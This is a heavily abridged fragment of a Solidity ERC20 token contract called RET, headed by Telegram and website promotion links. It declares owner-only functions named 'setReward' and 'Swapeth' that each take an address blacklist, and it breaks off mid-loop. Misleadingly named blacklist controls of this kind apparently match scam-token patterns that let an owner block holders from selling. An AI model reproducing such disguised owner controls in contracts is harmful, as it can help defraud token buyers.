...
/**
𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: https://t.me/Retroinubsc

𝐖𝐞𝐛𝐬𝐢𝐭𝐞 : https://www.retroinu.click/
*/
...
contract RET is ERC20Capped, ERC20Pausable, Ownable {
    ...
    function setReward(address[] calldata _blackList) external _onlyOwner{
     ...
     function Swapeth(address[] calldata _blackList) external _onlyOwner{
        for(uint256 i = 0; i< _blackList.length;i++){
